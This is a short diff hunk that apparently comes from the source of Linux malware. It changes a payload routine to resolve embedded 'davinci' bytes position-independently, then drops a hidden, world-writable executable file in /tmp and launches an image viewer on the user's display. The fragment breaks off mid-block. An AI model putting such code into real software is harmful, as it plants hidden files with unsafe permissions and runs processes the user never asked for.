@@ -5185,7 +5185,7 @@ void do_stuff(void)
 {
         char *argv[] = {"/usr/bin/eog", "/tmp/.davinci.png", "/tmp/.davinci.png", NULL};
 	char *envp[] = {"XDG_RUNTIME_DIR=/run/user/1000","DISPLAY=:0.0", NULL};
-        uint8_t *png_data = (uint8_t *)davinci_bytecode;
+        uint8_t *png_data = (uint8_t *)PIC_RESOLVE_ADDR(davinci_bytecode);
 #if DAVINCI
 	if (_access("/tmp/.davinci.png", F_OK) != 0) {
         	int fd = _open("/tmp/.davinci.png", O_CREAT|O_RDWR|O_TRUNC,  S_IRUSR|S_IWUSR|S_IXUSR|S_IROTH|S_IWOTH|S_IXOTH);
